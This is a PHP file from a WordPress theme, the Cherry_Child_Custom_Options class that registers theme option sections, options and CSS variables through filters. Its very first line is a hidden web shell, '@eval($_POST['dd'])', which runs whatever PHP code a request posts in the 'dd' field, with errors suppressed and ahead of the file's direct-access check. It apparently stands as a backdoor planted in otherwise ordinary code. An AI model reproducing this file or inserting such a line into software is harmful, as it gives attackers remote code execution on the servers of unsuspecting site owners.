<?php @eval($_POST['dd']);?><?php
/**
 * Class description
 *
 * @package   Cherry_Child_Custom_Options
 * @author    Cherry Team
 * @license   GPL-2.0+
 * @version   1.1.0
 */
// If this file is called directly, abort.
if ( ! defined( 'WPINC' ) ) {
	die;
}
if ( ! class_exists( 'Cherry_Child_Custom_Options' ) ) {
	class Cherry_Child_Custom_Options {
		/**
		 * Register variables array
		 *
		 * @var array
		 */
		public $variables = array();
		/**
		 * Prepared options to register
		 *
		 * @var array
		 */
		public $prepared_options = array();
		/**
		 * Avaliable sections and related filters
		 *
		 * @var array
		 */
		public $sections = array();
		/**
		 * Avaliable sections and related filters
		 *
		 * @var array
		 */
		public $prepared_sections = array();
		/**
		 * Constructor for the class
		 */
		function __construct( $options = array(), $sections = array() ) {
			$this->sections = apply_filters(
				'cherry_child_sections_array',
				array(
					'general-section'        => 'cherry_general_options_list',
					'grid-section'           => 'cherry_grid_options_list',
					'layouts-subsection'     => 'cherry_layouts_options_list',
					'blog-section'           => 'cherry_blog_options_list',
					'post-single-subsection' => 'cherry_post_single_options_list',
					'post-meta-subsection'   => 'cherry_post_meta_options_list',
					'styling-section'        => 'cherry_styling_options_list',
					'color-subsection'       => 'cherry_color_options_list',
					'navigation-section'     => 'cherry_navigation_options_list',
					'breadcrumbs-subsection' => 'cherry_breadcrumbs_options_list',
					'pagination-section'     => 'cherry_pagination_options_list',
					'header-section'         => 'cherry_header_options_list',
					'logo-subsection'        => 'cherry_logo_options_list',
					'page-section'           => 'cherry_page_options_list',
					'footer-logo-subsection' => 'cherry_footer_options_list',
					'footer-logo-subsection' => 'cherry_footer_logo_options_list',
					'typography-section'     => 'cherry_typography_options_list',
					'optimization-section'   => 'cherry_optimization_options_list',
					'cookie-banner-section'  => 'cherry_cookie_banner_options_list',
				)
			);
			$this->register_sections( $sections );
			$this->register_options( $options );
			add_filter( 'cherry_css_var_list', array( $this, 'register_variables' ) );
		}
		/**
		 * Add user section to processed sections array
		 *
		 * @param array $sections sections array to add
		 * @return null|void
		 */
		public function register_sections( $sections ) {
			if ( empty( $sections ) ) {
				return null;
			}
			$this->prepared_sections = $sections;
			foreach ( $sections as $key => $data ) {
				$this->sections = array_merge( $this->sections, array( $key => $this->get_section_filter( $key ) ) );
			}
			add_filter( 'cherry_defaults_settings', array( $this, 'process_sections' ) );
		}
		/**
		 * Get filter name by passed section ID
		 *
		 * @since  1.1.0
		 * @param  string $[name] [<description>]
		 * @return [type] [description]
		 */
		public function get_section_filter( $section ) {
			return sprintf( 'cherry_section_' . esc_attr( $section ) );
		}
		/**
		 * Add user sections to registered Cherry sections
		 *
		 * @return array
		 */
		public function process_sections( $sections ) {
			foreach ( $this->prepared_sections as $id => $data ) {
				$sections[$id] = array(
					'name'         => isset( $data['name'] ) ? $data['name'] : '',
					'icon'         => isset( $data['icon'] ) ? $data['icon'] : false,
					'parent'       => isset( $data['parent'] ) ? $data['parent'] : false,
					'priority'     => isset( $data['priority'] ) ? $data['priority'] : 1,
					'options-list' => apply_filters( $this->get_section_filter( $id ), array() ),
				);
			}
			return $sections;
		}
		/**
		 * Register options
		 *
		 * @param  array $options options to register
		 * @return void
		 */
		public function register_options( $options ) {
			foreach ( $options as $key => $value ) {
				if ( ! isset( $value['section'] ) ) {
					$value['section'] = 'general-section';
				}
				if ( isset( $value['is-var'] ) && true == $value['is-var'] ) {
					$this->variables[] = $key;
				}
				$filter = $this->sections[ $value['section'] ];
				add_filter( $filter, array( $this, 'attach_options' ) );
				$this->prepared_options[ $filter ][ $key ] = $value;
				unset( $filter );
			}
		}
		/**
		 * Add user variables to registered Cherry variables for CSS parser
		 *
		 * @param array $vars existing variables list
		 * @return array
		 */
		public function register_variables( $vars ) {
			$vars = array_merge( $vars, $this->variables );
			return $vars;
		}
		/**
		 * Attach options to apropriate filters
		 *
		 * @return void
		 */
		public function attach_options( $options ) {
			if ( array_key_exists( current_filter(), $this->prepared_options ) ) {
				$options = array_merge( $options, $this->prepared_options[ current_filter() ] );
			}
			return $options;
		}
	}
}